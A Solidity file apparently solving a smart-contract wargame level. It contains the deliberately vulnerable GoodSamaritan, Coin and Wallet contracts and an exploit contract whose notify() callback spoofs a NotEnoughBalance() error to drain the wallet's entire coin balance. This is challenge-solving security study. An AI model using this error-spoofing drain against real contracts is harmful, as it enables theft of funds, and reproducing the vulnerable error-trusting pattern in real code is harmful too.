// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            // When attacker receive 10 coins. Attacker contract will get notification allow throw an error same as catch to steal all balance.
            return true;
        } catch (bytes memory err) {
            // if wallet throw this especific error. give all coins. Somehow make error
            if (
                keccak256(abi.encodeWithSignature("NotEnoughBalance()")) ==
                keccak256(err)
            ) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_); //@audit here we can exploit contract
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}

// notify call will be called twice. One to revert error, 2nd time to get all balance.
// we want only throw error on the first time
contract GoodSamaritanExploit is INotifyable {
    address public owner;
    GoodSamaritan public target;
    Coin public coin;

    constructor(address target_) {
        owner = msg.sender;
        target = GoodSamaritan(target_);
        coin = Coin(target.coin());
    }

    function takeAllDonation() external {
        target.requestDonation();
        coin.transfer(owner, coin.balances(address(this)));
    }

    function notify(uint256 amount) external override {
        // throw NotEnoughBalance() error.
        if (amount < 100) {
            revert Wallet.NotEnoughBalance();
        }
    }
}
